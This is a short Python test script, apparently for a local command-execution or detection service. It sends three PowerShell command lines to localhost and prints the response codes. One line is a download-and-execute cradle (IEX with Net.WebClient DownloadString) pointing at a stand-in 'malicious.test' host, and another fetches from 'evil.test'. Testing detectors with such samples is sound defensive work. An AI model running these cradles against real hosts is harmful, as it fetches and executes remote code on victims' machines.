import requests

URL = "http://localhost:8000/exec"
cmds = [
"powershell -EncodedCommand SGVsbG8gV29ybGQ=",
"powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/payload')",
"powershell -Command DownloadString('http://evil.test/abc')"
]


for c in cmds:
    r = requests.post(URL, json={"command_line": c, "user": "svc_user"})
    print(r.status_code)